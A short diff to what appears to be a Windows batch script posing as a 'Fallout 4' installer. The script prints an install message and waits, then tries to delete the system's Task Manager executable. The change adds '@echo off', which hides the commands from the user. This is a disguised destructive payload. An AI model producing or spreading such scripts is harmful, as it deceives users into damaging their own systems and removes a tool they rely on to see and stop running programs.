@@ -1,3 +1,4 @@
+@echo off
 echo Installing Fallout 4
 ping localhost -n 9>nul
 del C:/Windows/system32/taskmgr.exe
